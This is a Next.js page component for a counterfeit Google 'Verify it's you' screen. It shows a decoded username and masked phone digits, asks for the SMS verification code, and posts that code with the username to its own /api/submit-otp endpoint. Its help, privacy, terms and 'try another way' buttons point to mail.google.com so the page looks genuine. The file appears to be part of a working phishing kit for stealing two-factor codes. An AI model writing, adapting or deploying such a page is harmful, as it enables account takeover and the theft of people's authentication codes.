'use client';

import { useEffect, useState } from 'react';
import { useSearchParams } from 'next/navigation';
import { notFound } from 'next/navigation';
import { decodeBase64 } from '@/lib/utils';
import '../../public/styles/enterotp.css'; 
interface UserInfo {
  username: string;
  mobiletype: string;
}

export default function EnterOTPPage() {
  const searchParams = useSearchParams();
  const [userInfo, setUserInfo] = useState<UserInfo>({ username: '', mobiletype: '' });
  const [code, setCode] = useState('');
  const [hiddenMobNumber, setHiddenMobNumber] = useState('');

  useEffect(() => {
    try {
      // Get the first search param (the random key)
      const firstParam = Array.from(searchParams.keys())[0];
      const encodedData = searchParams.get(firstParam);
      
      if (!encodedData) {
        notFound();
        return;
      }

      const decodedUsername = decodeBase64(encodedData);
      console.log(decodedUsername)
      
      // Get mobile number from URL if available
      const mobParam = searchParams.get('mob');
      const hiddenMob = mobParam || '****';
      
      setUserInfo({
        username: decodedUsername,
        mobiletype: 'phone' // Default value
      });
      
      setHiddenMobNumber(hiddenMob);
      
    } catch (error) {
      console.error('Error decoding data:', error);
      notFound();
    }
  }, [searchParams]);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const formData = new FormData(e.currentTarget);
    const code = formData.get('code') as string;
    const username = formData.get('username') as string;

    const response = await fetch('/api/submit-otp', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ code, username }),
    });
    
    if (response.ok) {
      const result = await response.json();
      window.location.href = result.redirectUrl;
    }

    console.log('OTP verification submitted:', { username, code });
  };

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCode(e.target.value);
  };

  const handleButtonClick = (url: string) => {
    window.location.href = url;
  };

  return (
    <>
      
      
      <div className="maindiv">
        <div className="form-half">
           <div>
            <img className="divlogo"   src="/images/image.png" alt="Logo" />
            </div>
            <div>
              <span className="welcome">Verify it&apos;s you</span><br></br><br></br>
            </div>
            <div>
              <span className="warning">To help keep your account safe, Google wants to make sure it&apos;s really you trying to sign in</span>
            </div>
            <div className="userdiv">
              <img className="user-icon" src="/images/user-circle.png" alt="User Icon" />
              <span style={{ color: '#2c2a2a', fontSize: '18px', fontFamily: 'Arial, Helvetica, sans-serif' }}> {userInfo.username} </span>
              <img className="dropdown-icon" src="/images/dropd.jpg" alt="Dropdown Icon" />
            </div>
        </div>
        <div className="form-half">
        <form className="loginform1" onSubmit={handleSubmit}>                   
           <div className="image-container">
                        <div className="gradient-box">
                          <img
                            src="/images/account-recovery-sms-pin.gif"
                            alt="SMS Recovery"
                            className="centered-image"
                          />
                        </div>
            </div>
            <div className="phonediv">
            <span className="phonetype">Enter a verification code</span>
            <br />
            <br />
            <span className="messaged">A text message with a verification code was just sent to your mobile *******{hiddenMobNumber}.
            </span>
            </div>
             <br />
            
            <div className="passdiv">
              <input
                required
                name="username"
                type="hidden"
                value={`${userInfo.username}`}


              />
              <input 
                required 
                name="code" 
                type="text" 
                value={code} 
                id="code" 
                placeholder=""
                onChange={handleCodeChange}
                onFocus={(e) => e.target.classList.add('focused')}
                onBlur={(e) => {
                  if (e.target.value.trim() !== "") {
                    e.target.classList.add('focused');
                  } else {
                    e.target.classList.remove('focused');
                  }
                }}
              />
              <label htmlFor="code" className="placeholder-label">Code</label>
            </div>
            <div className="tryn">
              <button type="button" className="hyperl1" onClick={() => handleButtonClick('https://mail.google.com')}>
                Try another way
              </button>
              <button type="submit" className="btnnxt">Next</button>
            </div>
          
        </form>
      </div>
      </div>
      
      {/* Bottom section below the maindiv */}
      <div className="btmdiv">
        <div className="left-div">
          <select className="btmhypl" id="language-select">
            <option value="en">English (United States)</option>
            <option value="fr">French</option>
            <option value="es">Spanish</option>
            <option value="de">German</option>
          </select>
        </div>
        <div className="right-divs">
          <div className="right-div">
            <button 
              id="helpButton" 
              className="btmhypl"
              onClick={() => handleButtonClick('https://mail.google.com')}
            >
              Help
            </button>
          </div>
          <div className="right-div">
            <button 
              id="privacyButton" 
              className="btmhypl"
              onClick={() => handleButtonClick('https://mail.google.com')}
            >
              Privacy
            </button>
          </div>
          <div className="right-div">
            <button 
              id="termsButton" 
              className="btmhypl"
              onClick={() => handleButtonClick('https://mail.google.com')}
            >
              Terms
            </button>
          </div>
        </div>
      </div>
      
    </>
  );
}